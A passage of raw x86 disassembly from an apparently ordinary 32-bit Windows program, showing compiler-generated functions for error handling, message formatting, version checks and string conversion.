  409152:	mov    eax,DWORD PTR [edx+0x8]
  409155:	mov    ecx,eax
  409157:	and    DWORD PTR [edi+0xc],0x0
  40915b:	mov    DWORD PTR [edi+0x8],eax
  40915e:	test   ecx,ecx
  409160:	je     0x409174
  409162:	mov    eax,DWORD PTR [ecx]
  409164:	push   esi
  409165:	push   ecx
  409166:	mov    esi,DWORD PTR [eax+0x4]
  409169:	mov    ecx,esi
  40916b:	call   DWORD PTR ds:0x41228c
  409171:	call   esi
  409173:	pop    esi
  409174:	mov    ecx,DWORD PTR [ebp-0x4]
  409177:	mov    eax,edi
  409179:	xor    ecx,ebp
  40917b:	pop    edi
  40917c:	call   0x40e2c0
  409181:	mov    esp,ebp
  409183:	pop    ebp
  409184:	ret    0x4
  409187:	int3   
  409188:	int3   
  409189:	int3   
  40918a:	int3   
  40918b:	int3   
  40918c:	int3   
  40918d:	int3   
  40918e:	int3   
  40918f:	int3   
  409190:	mov    edi,edi
  409192:	push   ebp
  409193:	mov    ebp,esp
  409195:	push   ecx
  409196:	mov    eax,ds:0x411004
  40919b:	xor    eax,ebp
  40919d:	mov    DWORD PTR [ebp-0x4],eax
  4091a0:	push   edi
  4091a1:	mov    edi,ecx
  4091a3:	mov    ecx,DWORD PTR [edi+0x8]
  4091a6:	mov    DWORD PTR [edi],0x401074
  4091ac:	test   ecx,ecx
  4091ae:	je     0x4091c2
  4091b0:	mov    eax,DWORD PTR [ecx]
  4091b2:	push   esi
  4091b3:	push   ecx
  4091b4:	mov    esi,DWORD PTR [eax+0x8]
  4091b7:	mov    ecx,esi
  4091b9:	call   DWORD PTR ds:0x41228c
  4091bf:	call   esi
  4091c1:	pop    esi
  4091c2:	cmp    DWORD PTR [edi+0xc],0x0
  4091c6:	je     0x4091d1
  4091c8:	push   DWORD PTR [edi+0xc]
  4091cb:	call   DWORD PTR ds:0x4120c0
  4091d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4091d4:	xor    ecx,ebp
  4091d6:	pop    edi
  4091d7:	call   0x40e2c0
  4091dc:	mov    esp,ebp
  4091de:	pop    ebp
  4091df:	ret    
  4091e0:	int3   
  4091e1:	int3   
  4091e2:	int3   
  4091e3:	int3   
  4091e4:	int3   
  4091e5:	mov    edi,edi
  4091e7:	push   ebp
  4091e8:	mov    ebp,esp
  4091ea:	sub    esp,0x10
  4091ed:	push   ecx
  4091ee:	push   ecx
  4091ef:	push   ecx
  4091f0:	lea    ecx,[ebp-0x10]
  4091f3:	call   0x4090d2
  4091f8:	push   0x410df0
  4091fd:	mov    eax,ecx
  4091ff:	push   eax
  409200:	call   0x40e9f8
  409205:	int3   
  409206:	int3   
  409207:	int3   
  409208:	int3   
  409209:	int3   
  40920a:	int3   
  40920b:	mov    edi,edi
  40920d:	push   esi
  40920e:	xor    esi,esi
  409210:	inc    esi
  409211:	cmp    DWORD PTR ds:0x4114b0,esi
  409217:	jne    0x409244
  409219:	mov    ecx,DWORD PTR ds:0x4114a8
  40921f:	call   0x40b10f
  409224:	test   eax,eax
  409226:	jne    0x409240
  409228:	call   DWORD PTR ds:0x4120cc
  40922e:	test   eax,eax
  409230:	jne    0x4092d6
  409236:	push   0x42b
  40923b:	jmp    0x4092d0
  409240:	mov    eax,esi
  409242:	pop    esi
  409243:	ret    
  409244:	cmp    DWORD PTR ds:0x4114a8,0x0
  40924b:	jne    0x409228
  40924d:	call   0x40b124
  409252:	mov    ecx,eax
  409254:	mov    DWORD PTR ds:0x4114a8,ecx
  40925a:	call   0x40b10f
  40925f:	test   eax,eax
  409261:	je     0x4092c4
  409263:	push   ecx
  409264:	mov    edx,0x401ab8
  409269:	call   0x40b1ba
  40926e:	test   eax,eax
  409270:	jne    0x4092c4
  409272:	mov    ecx,DWORD PTR ds:0x4114a8
  409278:	push   0x3
  40927a:	pop    edx
  40927b:	call   0x40b36e
  409280:	cmp    eax,esi
  409282:	jne    0x4092c4
  409284:	mov    ecx,DWORD PTR ds:0x4114a8
  40928a:	push   0x3
  40928c:	pop    edx
  40928d:	call   0x40b36e
  409292:	cmp    eax,0x2
  409295:	jne    0x4092c4
  409297:	mov    ecx,DWORD PTR ds:0x4114a8
  40929d:	push   0x3
  40929f:	pop    edx
  4092a0:	call   0x40b36e
  4092a5:	cmp    eax,0x3
  4092a8:	jne    0x4092c4
  4092aa:	push   0x0
  4092ac:	mov    DWORD PTR ds:0x4114b0,esi
  4092b2:	call   DWORD PTR ds:0x412094
  4092b8:	xor    ecx,ecx
  4092ba:	test   ax,ax
  4092bd:	pop    esi
  4092be:	setne  cl
  4092c1:	mov    eax,ecx
  4092c3:	ret    
  4092c4:	call   DWORD PTR ds:0x4120cc
  4092ca:	test   eax,eax
  4092cc:	jne    0x4092d6
  4092ce:	push   0x8
  4092d0:	call   DWORD PTR ds:0x412014
  4092d6:	xor    eax,eax
  4092d8:	pop    esi
  4092d9:	ret    
  4092da:	int3   
  4092db:	int3   
  4092dc:	int3   
  4092dd:	int3   
  4092de:	int3   
  4092df:	cmp    DWORD PTR ds:0x4114b0,0x0
  4092e6:	push   esi
  4092e7:	mov    esi,ecx
  4092e9:	je     0x409330
  4092eb:	push   0x3
  4092ed:	pop    edx
  4092ee:	call   0x40b504
  4092f3:	cmp    eax,esi
  4092f5:	jbe    0x409330
  4092f7:	push   esi
  4092f8:	call   0x40b97f
  4092fd:	test   eax,eax
  4092ff:	je     0x409330
  409301:	mov    ecx,DWORD PTR ds:0x4114a8
  409307:	push   esi
  409308:	push   0x3
  40930a:	pop    edx
  40930b:	call   0x40b780
  409310:	mov    esi,eax
  409312:	test   esi,esi
  409314:	je     0x409330
  409316:	push   0x7
  409318:	push   0x401ab0
  40931d:	push   esi
  40931e:	call   DWORD PTR ds:0x412248
  409324:	add    esp,0xc
  409327:	test   eax,eax
  409329:	jne    0x409330
  40932b:	mov    eax,DWORD PTR [esi+0xc]
  40932e:	pop    esi
  40932f:	ret    
  409330:	xor    eax,eax
  409332:	pop    esi
  409333:	ret    
  409334:	int3   
  409335:	int3   
  409336:	int3   
  409337:	int3   
  409338:	int3   
  409339:	mov    edi,edi
  40933b:	push   ebp
  40933c:	mov    ebp,esp
  40933e:	push   ecx
  40933f:	push   ecx
  409340:	push   ebx
  409341:	push   esi
  409342:	mov    ebx,edx
  409344:	mov    esi,ecx
  409346:	mov    DWORD PTR [ebp-0x8],esi
  409349:	push   edi
  40934a:	mov    edi,DWORD PTR [ebp+0x8]
  40934d:	test   ebx,ebx
  40934f:	jne    0x40935c
  409351:	test   edi,edi
  409353:	jne    0x40935c
  409355:	xor    eax,eax
  409357:	jmp    0x409495
  40935c:	call   0x40920b
  409361:	test   eax,eax
  409363:	je     0x409355
  409365:	push   0x3
  409367:	pop    edx
  409368:	call   0x40b504
  40936d:	mov    DWORD PTR [ebp-0x4],eax
  409370:	cmp    eax,esi
  409372:	ja     0x409398
  409374:	mov    ecx,DWORD PTR ds:0x4114a8
  40937a:	push   0x3
  40937c:	pop    edx
  40937d:	call   0x40b52e
  409382:	test   eax,eax
  409384:	je     0x409355
  409386:	mov    edx,esi
  409388:	mov    ecx,eax
  40938a:	sub    edx,DWORD PTR [ebp-0x4]
  40938d:	inc    edx
  40938e:	call   0x40b3ef
  409393:	cmp    eax,0xffffffff
  409396:	je     0x409355
  409398:	push   esi
  409399:	call   0x40b97f
  40939e:	test   eax,eax
  4093a0:	je     0x409427
  4093a6:	mov    ecx,DWORD PTR ds:0x4114a8
  4093ac:	push   esi
  4093ad:	push   0x3
  4093af:	pop    edx
  4093b0:	call   0x40b780
  4093b5:	mov    esi,eax
  4093b7:	test   esi,esi
  4093b9:	je     0x409355
  4093bb:	push   0x7
  4093bd:	push   0x401ab0
  4093c2:	push   esi
  4093c3:	call   DWORD PTR ds:0x412248
  4093c9:	add    esp,0xc
  4093cc:	test   eax,eax
  4093ce:	jne    0x409355
  4093d0:	test   ebx,ebx
  4093d2:	je     0x4093de
  4093d4:	mov    ecx,ebx
  4093d6:	call   0x40a30b
  4093db:	lea    edi,[eax+0x1]
  4093de:	mov    ecx,DWORD PTR [esi+0x8]
  4093e1:	cmp    edi,ecx
  4093e3:	ja     0x4093f4
  4093e5:	cmp    edi,0x100
  4093eb:	jbe    0x40940e
  4093ed:	lea    eax,[edi+edi*1]
  4093f0:	cmp    eax,ecx
  4093f2:	jae    0x40940e
  4093f4:	test   ecx,ecx
  4093f6:	jne    0x409470
  4093f8:	lea    ecx,[edi+edi*1]
  4093fb:	call   0x40ab1d
  409400:	mov    DWORD PTR [esi+0xc],eax
  409403:	test   eax,eax
  409405:	je     0x409355
  40940b:	mov    DWORD PTR [esi+0x8],edi
  40940e:	mov    ecx,DWORD PTR [esi+0xc]
  409411:	test   ecx,ecx
  409413:	je     0x409355
  409419:	test   ebx,ebx
  40941b:	je     0x40947d
  40941d:	push   edi
  40941e:	mov    edx,ebx
  409420:	call   0x40a26c
  409425:	jmp    0x409492
  409427:	push   0x10
  409429:	pop    ecx
  40942a:	call   0x40ab1d
  40942f:	mov    esi,eax
  409431:	mov    DWORD PTR [ebp-0x4],esi
  409434:	test   esi,esi
  409436:	je     0x409355
  40943c:	and    DWORD PTR [esi+0x8],0x0
  409440:	mov    edx,0x401ab0
  409445:	and    DWORD PTR [esi+0xc],0x0
  409449:	mov    ecx,esi
  40944b:	push   0x7
  40944d:	call   0x40a209
  409452:	push   esi
  409453:	push   DWORD PTR [ebp-0x8]
  409456:	call   0x40b8e0
  40945b:	test   eax,eax
  40945d:	jne    0x4093bb
  409463:	lea    ecx,[ebp-0x4]
  409466:	call   0x40aa69
  40946b:	jmp    0x409355
  409470:	lea    edx,[edi+edi*1]
  409473:	lea    ecx,[esi+0xc]
  409476:	call   0x40abc2
  40947b:	jmp    0x409403
  40947d:	cmp    DWORD PTR [ebp+0xc],0x1
  409481:	jne    0x409492
  409483:	lea    eax,[edi+edi*1]
  409486:	push   eax
  409487:	push   0x0
  409489:	push   ecx
  40948a:	call   0x40eb54
  40948f:	add    esp,0xc
  409492:	mov    eax,DWORD PTR [esi+0xc]
  409495:	pop    edi
  409496:	pop    esi
  409497:	pop    ebx
  409498:	mov    esp,ebp
  40949a:	pop    ebp
  40949b:	ret    0x8
  40949e:	int3   
  40949f:	int3   
  4094a0:	int3   
  4094a1:	int3   
  4094a2:	int3   
  4094a3:	mov    ecx,DWORD PTR ds:0x4114a8
  4094a9:	test   ecx,ecx
  4094ab:	je     0x4094bd
  4094ad:	call   0x40b10f
  4094b2:	test   eax,eax
  4094b4:	je     0x4094bd
  4094b6:	xor    edx,edx
  4094b8:	jmp    0x40b557
  4094bd:	mov    eax,0x401ab8
  4094c2:	ret    
  4094c3:	int3   
  4094c4:	int3   
  4094c5:	int3   
  4094c6:	int3   
  4094c7:	int3   
  4094c8:	mov    edi,edi
  4094ca:	push   esi
  4094cb:	push   edi
  4094cc:	mov    esi,ecx
  4094ce:	call   DWORD PTR ds:0x4120cc
  4094d4:	mov    edi,eax
  4094d6:	test   esi,esi
  4094d8:	jne    0x4094f0
  4094da:	call   DWORD PTR ds:0x4120cc
  4094e0:	test   eax,eax
  4094e2:	jne    0x4094ec
  4094e4:	push   0x57
  4094e6:	call   DWORD PTR ds:0x412014
  4094ec:	xor    eax,eax
  4094ee:	jmp    0x409524
  4094f0:	call   0x40920b
  4094f5:	test   eax,eax
  4094f7:	je     0x4094ec
  4094f9:	push   ecx
  4094fa:	mov    ecx,DWORD PTR ds:0x4114a8
  409500:	xor    edx,edx
  409502:	push   esi
  409503:	call   0x40b7e2
  409508:	test   eax,eax
  40950a:	jne    0x40951a
  40950c:	call   DWORD PTR ds:0x4120cc
  409512:	test   eax,eax
  409514:	jne    0x4094ec
  409516:	push   0x8
  409518:	jmp    0x4094e6
  40951a:	push   edi
  40951b:	call   DWORD PTR ds:0x412014
  409521:	xor    eax,eax
  409523:	inc    eax
  409524:	pop    edi
  409525:	pop    esi
  409526:	ret    
  409527:	int3   
  409528:	int3   
  409529:	int3   
  40952a:	int3   
  40952b:	int3   
  40952c:	mov    edi,edi
  40952e:	push   ebp
  40952f:	mov    ebp,esp
  409531:	mov    ecx,DWORD PTR [ebp+0xc]
  409534:	push   esi
  409535:	xor    esi,esi
  409537:	test   ecx,ecx
  409539:	jne    0x40954f
  40953b:	call   DWORD PTR ds:0x4120cc
  409541:	test   eax,eax
  409543:	jne    0x4095b6
  409545:	push   0x57
  409547:	call   DWORD PTR ds:0x412014
  40954d:	jmp    0x4095b6
  40954f:	cmp    DWORD PTR [ebp+0x8],esi
  409552:	jne    0x40955e
  409554:	call   0x4094c8
  409559:	xor    eax,eax
  40955b:	inc    eax
  40955c:	jmp    0x4095b8
  40955e:	push   edi
  40955f:	push   0x1
  409561:	add    esi,0x100
  409567:	xor    edx,edx
  409569:	push   esi
  40956a:	push   0x5
  40956c:	pop    ecx
  40956d:	call   0x409339
  409572:	mov    edi,eax
  409574:	test   edi,edi
  409576:	je     0x4095a3
  409578:	lea    eax,[ebp+0x10]
  40957b:	mov    edx,esi
  40957d:	push   eax
  40957e:	push   DWORD PTR [ebp+0xc]
  409581:	mov    ecx,edi
  409583:	call   0x40ae78
  409588:	cmp    eax,0x8007007a
  40958d:	je     0x40955f
  40958f:	test   eax,eax
  409591:	jns    0x409599
  409593:	movzx  eax,ax
  409596:	push   eax
  409597:	jmp    0x4095af
  409599:	mov    ecx,edi
  40959b:	pop    edi
  40959c:	pop    esi
  40959d:	pop    ebp
  40959e:	jmp    0x4094c8
  4095a3:	call   DWORD PTR ds:0x4120cc
  4095a9:	test   eax,eax
  4095ab:	jne    0x4095b5
  4095ad:	push   0x8
  4095af:	call   DWORD PTR ds:0x412014
  4095b5:	pop    edi
  4095b6:	xor    eax,eax
  4095b8:	pop    esi
  4095b9:	pop    ebp
  4095ba:	ret    
  4095bb:	int3   
  4095bc:	int3   
  4095bd:	int3   
  4095be:	int3   
  4095bf:	int3   
  4095c0:	mov    edi,edi
  4095c2:	push   ebp
  4095c3:	mov    ebp,esp
  4095c5:	push   ecx
  4095c6:	push   esi
  4095c7:	xor    esi,esi
  4095c9:	mov    DWORD PTR [ebp-0x4],esi
  4095cc:	call   0x40920b
  4095d1:	test   eax,eax
  4095d3:	je     0x409640
  4095d5:	push   esi
  4095d6:	push   esi
  4095d7:	lea    eax,[ebp-0x4]
  4095da:	push   eax
  4095db:	push   esi
  4095dc:	call   DWORD PTR ds:0x4120cc
  4095e2:	push   eax
  4095e3:	push   esi
  4095e4:	push   0x1300
  4095e9:	call   DWORD PTR ds:0x412034
  4095ef:	test   eax,eax
  4095f1:	je     0x40960e
  4095f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4095f6:	test   ecx,ecx
  4095f8:	je     0x40962e
  4095fa:	call   0x4094c8
  4095ff:	push   DWORD PTR [ebp-0x4]
  409602:	mov    esi,eax
  409604:	call   DWORD PTR ds:0x4120c0
  40960a:	mov    eax,esi
  40960c:	jmp    0x409642
  40960e:	cmp    DWORD PTR [ebp-0x4],esi
  409611:	je     0x40962e
  409613:	push   DWORD PTR [ebp-0x4]
  409616:	call   DWORD PTR ds:0x4120c0
  40961c:	call   DWORD PTR ds:0x4120cc
  409622:	test   eax,eax
  409624:	jne    0x40962e
  409626:	push   0x8
  409628:	call   DWORD PTR ds:0x412014
  40962e:	call   DWORD PTR ds:0x4120cc
  409634:	test   eax,eax
  409636:	jne    0x409640
  409638:	push   0x8
  40963a:	call   DWORD PTR ds:0x412014
  409640:	xor    eax,eax
  409642:	pop    esi
  409643:	mov    esp,ebp
  409645:	pop    ebp
  409646:	ret    
  409647:	int3   
  409648:	int3   
  409649:	int3   
  40964a:	int3   
  40964b:	int3   
  40964c:	mov    edi,edi
  40964e:	push   ebp
  40964f:	mov    ebp,esp
  409651:	push   ecx
  409652:	and    DWORD PTR [ebp-0x4],0x0
  409656:	xor    edx,edx
  409658:	push   esi
  409659:	push   edi
  40965a:	push   0x1
  40965c:	mov    edi,0x100
  409661:	xor    ecx,ecx
  409663:	push   edi
  409664:	call   0x409339
  409669:	mov    esi,eax
  40966b:	test   esi,esi
  40966d:	jne    0x409674
  40966f:	push   0x8
  409671:	pop    eax
  409672:	jmp    0x4096bb
  409674:	push   0x1
  409676:	xor    ecx,ecx
  409678:	xor    edx,edx
  40967a:	push   edi
  40967b:	inc    ecx
  40967c:	call   0x409339
  409681:	mov    edi,eax
  409683:	test   edi,edi
  409685:	je     0x40966f
  409687:	mov    ecx,edi
  409689:	call   0x40aca3
  40968e:	shr    eax,1
  409690:	mov    ecx,esi
  409692:	dec    eax
  409693:	push   eax
  409694:	push   edi
  409695:	call   0x40aca3
  40969a:	shr    eax,1
  40969c:	dec    eax
  40969d:	push   eax
  40969e:	push   esi
  40969f:	lea    eax,[ebp-0x4]
  4096a2:	push   eax
  4096a3:	call   DWORD PTR ds:0x4120e0
  4096a9:	test   eax,eax
  4096ab:	jne    0x4096bb
  4096ad:	mov    ecx,esi
  4096af:	call   0x4094c8
  4096b4:	test   eax,eax
  4096b6:	je     0x40966f
  4096b8:	mov    eax,DWORD PTR [ebp-0x4]
  4096bb:	pop    edi
  4096bc:	pop    esi
  4096bd:	mov    esp,ebp
  4096bf:	pop    ebp
  4096c0:	ret    
  4096c1:	int3   
  4096c2:	int3   
  4096c3:	int3   
  4096c4:	int3   
  4096c5:	int3   
  4096c6:	mov    edi,edi
  4096c8:	push   esi
  4096c9:	mov    esi,ecx
  4096cb:	call   0x4095c0
  4096d0:	test   eax,eax
  4096d2:	jne    0x4096d6
  4096d4:	pop    esi
  4096d5:	ret    
  4096d6:	call   0x4094a3
  4096db:	mov    edx,eax
  4096dd:	mov    ecx,esi
  4096df:	call   0x40a377
  4096e4:	neg    eax
  4096e6:	pop    esi
  4096e7:	sbb    eax,eax
  4096e9:	neg    eax
  4096eb:	ret    
  4096ec:	int3   
  4096ed:	int3   
  4096ee:	int3   
  4096ef:	int3   
  4096f0:	int3   
  4096f1:	mov    edi,edi
  4096f3:	push   ebx
  4096f4:	push   esi
  4096f5:	mov    esi,ecx
  4096f7:	mov    ebx,edx
  4096f9:	test   esi,esi
  4096fb:	je     0x40976d
  4096fd:	test   ebx,0xf0000
  409703:	je     0x40976d
  409705:	test   ebx,0x10000
  40970b:	je     0x409712
  40970d:	call   0x4095c0
  409712:	push   edi
  409713:	xor    edi,edi
  409715:	inc    edi
  409716:	test   bl,0x1
  409719:	je     0x409722
  40971b:	mov    ecx,0x1389
  409720:	jmp    0x409744
  409722:	test   bl,0x4
  409725:	je     0x40972e
  409727:	mov    ecx,0x138a
  40972c:	jmp    0x409744
  40972e:	test   bl,0x2
  409731:	je     0x40973a
  409733:	mov    ecx,0x138c
  409738:	jmp    0x409744
  40973a:	test   bl,0x8
  40973d:	je     0x40975a
  40973f:	mov    ecx,0x138b
  409744:	call   0x4098dc
  409749:	push   eax
  40974a:	push   0x401a7c
  40974f:	push   edi
  409750:	push   edi
  409751:	push   esi
  409752:	call   0x40a5d0
  409757:	add    esp,0x14
  40975a:	call   0x4094a3
  40975f:	mov    edx,eax
  409761:	mov    ecx,esi
  409763:	call   0x40a377
  409768:	mov    eax,edi
  40976a:	pop    edi
  40976b:	jmp    0x409781
  40976d:	call   DWORD PTR ds:0x4120cc
  409773:	test   eax,eax
  409775:	jne    0x40977f
  409777:	push   0x57
  409779:	call   DWORD PTR ds:0x412014
  40977f:	xor    eax,eax
  409781:	pop    esi
  409782:	pop    ebx
  409783:	ret    
  409784:	int3   
  409785:	int3   
  409786:	int3   
  409787:	int3   
  409788:	int3   
  409789:	mov    edi,edi
  40978b:	push   ebp
  40978c:	mov    ebp,esp
  40978e:	push   ecx
  40978f:	mov    ecx,DWORD PTR ds:0x4114a8
  409795:	call   0x40b10f
  40979a:	cmp    eax,0x1
  40979d:	jne    0x40981e
  40979f:	push   edi
  4097a0:	push   0x3
  4097a2:	pop    edx
  4097a3:	call   0x40b504
  4097a8:	mov    edi,eax
  4097aa:	test   edi,edi
  4097ac:	je     0x409813
  4097ae:	push   esi
  4097af:	lea    esi,[edi-0x1]
  4097b2:	push   esi
  4097b3:	call   0x40b97f
  4097b8:	cmp    eax,0x10000
  4097bd:	jne    0x40980c
  4097bf:	mov    ecx,DWORD PTR ds:0x4114a8
  4097c5:	push   esi
  4097c6:	push   0x3
  4097c8:	pop    edx
  4097c9:	call   0x40b780
  4097ce:	mov    DWORD PTR [ebp-0x4],eax
  4097d1:	test   eax,eax
  4097d3:	je     0x40980c
  4097d5:	lea    ecx,[eax+0xc]
  4097d8:	call   0x40aa69
  4097dd:	lea    ecx,[ebp-0x4]
  4097e0:	call   0x40aa69
  4097e5:	mov    ecx,DWORD PTR ds:0x4114a8
  4097eb:	push   0x0
  4097ed:	push   0x3
  4097ef:	pop    edx
  4097f0:	call   0x40aeb4
  4097f5:	test   eax,eax
  4097f7:	je     0x40980c
  4097f9:	cmp    DWORD PTR [eax+0x4],0x80000
  409800:	jne    0x40980c
  409802:	mov    ecx,DWORD PTR [eax+0xc]
  409805:	mov    edx,esi
  409807:	call   0x40b49a
  40980c:	dec    esi
  40980d:	sub    edi,0x1
  409810:	jne    0x4097b2
  409812:	pop    esi
  409813:	mov    ecx,0x4114a8
  409818:	call   0x40b196
  40981d:	pop    edi
  40981e:	cmp    DWORD PTR ds:0x4114ac,0x1
  409825:	jne    0x40982d
  409827:	call   DWORD PTR ds:0x41216c
  40982d:	xor    eax,eax
  40982f:	inc    eax
  409830:	mov    esp,ebp
  409832:	pop    ebp
  409833:	ret    
  409834:	int3   
  409835:	int3   
  409836:	int3   
  409837:	int3   
  409838:	int3   
  409839:	mov    edi,edi
  40983b:	push   ebp
  40983c:	mov    ebp,esp
  40983e:	sub    esp,0x128
  409844:	mov    eax,ds:0x411004
  409849:	xor    eax,ebp
  40984b:	mov    DWORD PTR [ebp-0x4],eax
  40984e:	push   esi
  40984f:	mov    esi,0x11c
  409854:	lea    eax,[ebp-0x128]
  40985a:	push   esi
  40985b:	push   0x0
  40985d:	push   eax
  40985e:	call   0x40eb54
  409863:	mov    ax,ds:0x4114a4
  409869:	add    esp,0xc
  40986c:	mov    DWORD PTR [ebp-0x128],esi
  409872:	xor    esi,esi
  409874:	inc    esi
  409875:	mov    DWORD PTR [ebp-0x124],0x5
  40987f:	mov    DWORD PTR [ebp-0x120],esi
  409885:	push   0x3
  409887:	push   0x2
  409889:	push   0x0
  40988b:	push   0x0
  40988d:	mov    WORD PTR [ebp-0x14],ax
  409891:	call   DWORD PTR ds:0x412284
  409897:	push   0x3
  409899:	push   esi
  40989a:	push   edx
  40989b:	push   eax
  40989c:	call   DWORD PTR ds:0x412284
  4098a2:	push   0x3
  4098a4:	push   0x20
  4098a6:	push   edx
  4098a7:	push   eax
  4098a8:	call   DWORD PTR ds:0x412284
  4098ae:	push   edx
  4098af:	push   eax
  4098b0:	push   0x3
  4098b2:	lea    eax,[ebp-0x128]
  4098b8:	push   eax
  4098b9:	call   DWORD PTR ds:0x412280
  4098bf:	xor    ecx,ecx
  4098c1:	test   eax,eax
  4098c3:	pop    esi
  4098c4:	setns  cl
  4098c7:	mov    eax,ecx
  4098c9:	mov    ecx,DWORD PTR [ebp-0x4]
  4098cc:	xor    ecx,ebp
  4098ce:	call   0x40e2c0
  4098d3:	mov    esp,ebp
  4098d5:	pop    ebp
  4098d6:	ret    
  4098d7:	int3   
  4098d8:	int3   
  4098d9:	int3   
  4098da:	int3   
  4098db:	int3   
  4098dc:	mov    eax,ds:0x4114a0
  4098e1:	xor    edx,edx
  4098e3:	push   esi
  4098e4:	push   0xa
  4098e6:	inc    eax
  4098e7:	pop    esi
  4098e8:	mov    ds:0x4114a0,eax
  4098ed:	div    esi
  4098ef:	add    edx,0x4
  4098f2:	push   edx
  4098f3:	mov    edx,ecx
  4098f5:	call   0x409901
  4098fa:	pop    esi
  4098fb:	ret    
  4098fc:	int3   
  4098fd:	int3   
  4098fe:	int3   
  4098ff:	int3   
  409900:	int3   
  409901:	mov    edi,edi
  409903:	push   ebp
  409904:	mov    ebp,esp
  409906:	push   ecx
  409907:	and    DWORD PTR [ebp-0x4],0x0
  40990b:	push   ebx
  40990c:	mov    ebx,edx
  40990e:	test   ebx,ebx
  409910:	jne    0x40992e
  409912:	call   DWORD PTR ds:0x4120cc
  409918:	test   eax,eax
  40991a:	jne    0x409924
  40991c:	push   0x57
  40991e:	call   DWORD PTR ds:0x412014
  409924:	mov    eax,0x401ab8
  409929:	jmp    0x409a40
  40992e:	call   0x40920b
  409933:	test   eax,eax
  409935:	je     0x409924
  409937:	xor    edx,edx
  409939:	push   esi
  40993a:	inc    edx
  40993b:	call   0x40b504
  409940:	mov    esi,eax
  409942:	cmp    esi,DWORD PTR [ebp+0x8]
  409945:	ja     0x409987
  409947:	mov    ecx,DWORD PTR ds:0x4114a8
  40994d:	xor    edx,edx
  40994f:	inc    edx
  409950:	call   0x40b52e
  409955:	test   eax,eax
  409957:	je     0x40996b
  409959:	mov    edx,DWORD PTR [ebp+0x8]
  40995c:	mov    ecx,eax
  40995e:	sub    edx,esi
  409960:	inc    edx
  409961:	call   0x40b3ef
  409966:	cmp    eax,0xffffffff
  409969:	jne    0x409987
  40996b:	call   DWORD PTR ds:0x4120cc
  409971:	test   eax,eax
  409973:	jne    0x40997d
  409975:	push   0x8
  409977:	call   DWORD PTR ds:0x412014
  40997d:	mov    eax,0x401ab8
  409982:	jmp    0x409a3f
  409987:	mov    esi,0x80
  40998c:	push   edi
  40998d:	push   0x1
  40998f:	add    esi,esi
  409991:	xor    edx,edx
  409993:	push   esi
  409994:	push   0x4
  409996:	pop    ecx
  409997:	call   0x409339
  40999c:	mov    edi,eax
  40999e:	test   edi,edi
  4099a0:	je     0x409a27
  4099a6:	push   esi
  4099a7:	push   edi
  4099a8:	push   ebx
  4099a9:	push   0x0
  4099ab:	call   DWORD PTR ds:0x412140
  4099b1:	mov    ecx,eax
  4099b3:	test   ecx,ecx
  4099b5:	jne    0x4099e3
  4099b7:	call   DWORD PTR ds:0x4120cc
  4099bd:	cmp    eax,0x716
  4099c2:	jne    0x409a39
  4099c4:	xor    ecx,ecx
  4099c6:	lea    eax,[ebp-0x4]
  4099c9:	push   ecx
  4099ca:	push   ecx
  4099cb:	push   eax
  4099cc:	push   ecx
  4099cd:	push   ebx
  4099ce:	push   ecx
  4099cf:	push   0xb00
  4099d4:	call   DWORD PTR ds:0x412034
  4099da:	mov    ecx,eax
  4099dc:	test   ecx,ecx
  4099de:	je     0x409a39
  4099e0:	mov    edi,DWORD PTR [ebp-0x4]
  4099e3:	lea    eax,[esi-0x1]
  4099e6:	cmp    ecx,eax
  4099e8:	jae    0x40998d
  4099ea:	push   ecx
  4099eb:	mov    ecx,DWORD PTR ds:0x4114a8
  4099f1:	xor    edx,edx
  4099f3:	push   edi
  4099f4:	push   DWORD PTR [ebp+0x8]
  4099f7:	inc    edx
  4099f8:	call   0x40b94a
  4099fd:	test   eax,eax
  4099ff:	je     0x409a27
  409a01:	cmp    DWORD PTR [ebp-0x4],0x0
  409a05:	je     0x409a14
  409a07:	push   DWORD PTR [ebp-0x4]
  409a0a:	call   DWORD PTR ds:0x4120c0
  409a10:	and    DWORD PTR [ebp-0x4],0x0
  409a14:	push   DWORD PTR [ebp+0x8]
  409a17:	mov    ecx,DWORD PTR ds:0x4114a8
  409a1d:	xor    edx,edx
  409a1f:	inc    edx
  409a20:	call   0x40b7b1
  409a25:	jmp    0x409a3e
  409a27:	call   DWORD PTR ds:0x4120cc
  409a2d:	test   eax,eax
  409a2f:	jne    0x409a39
  409a31:	push   0x8
  409a33:	call   DWORD PTR ds:0x412014
  409a39:	mov    eax,0x401ab8
  409a3e:	pop    edi
  409a3f:	pop    esi
  409a40:	pop    ebx
  409a41:	mov    esp,ebp
  409a43:	pop    ebp
  409a44:	ret    0x4
  409a47:	int3   
  409a48:	int3   
  409a49:	int3   
  409a4a:	int3   
  409a4b:	int3   
  409a4c:	mov    edi,edi
  409a4e:	push   ebp
  409a4f:	mov    ebp,esp
  409a51:	sub    esp,0x10
  409a54:	push   esi
  409a55:	push   edi
  409a56:	mov    esi,ecx
  409a58:	xor    edi,edi
  409a5a:	mov    DWORD PTR [ebp-0x4],edi
  409a5d:	test   esi,esi
  409a5f:	je     0x409acb
  409a61:	call   0x40a30b
  409a66:	test   eax,eax
  409a68:	je     0x409acb
  409a6a:	call   0x40920b
  409a6f:	test   eax,eax
  409a71:	je     0x409add
  409a73:	push   edi
  409a74:	push   edi
  409a75:	mov    edx,esi
  409a77:	xor    ecx,ecx
  409a79:	call   0x409339
  409a7e:	mov    esi,eax
  409a80:	test   esi,esi
  409a82:	jne    0x409a92
  409a84:	call   DWORD PTR ds:0x4120cc
  409a8a:	test   eax,eax
  409a8c:	jne    0x409add
  409a8e:	push   0x8
  409a90:	jmp    0x409ad7
  409a92:	call   DWORD PTR ds:0x412250
  409a98:	mov    DWORD PTR [eax],edi
  409a9a:	lea    eax,[ebp-0x4]
  409a9d:	push   eax
  409a9e:	push   esi
  409a9f:	call   DWORD PTR ds:0x412254
  409aa5:	add    esp,0x8
  409aa8:	fstp   QWORD PTR [ebp-0x10]
  409aab:	call   DWORD PTR ds:0x412250
  409ab1:	cmp    DWORD PTR [eax],0x22
  409ab4:	je     0x409acb
  409ab6:	mov    ecx,DWORD PTR [ebp-0x4]
  409ab9:	test   ecx,ecx
  409abb:	je     0x409ac6
  409abd:	call   0x40a30b
  409ac2:	test   eax,eax
  409ac4:	jne    0x409acb
  409ac6:	fld    QWORD PTR [ebp-0x10]
  409ac9:	jmp    0x409adf
  409acb:	call   DWORD PTR ds:0x4120cc
  409ad1:	test   eax,eax
  409ad3:	jne    0x409add
  409ad5:	push   0x57
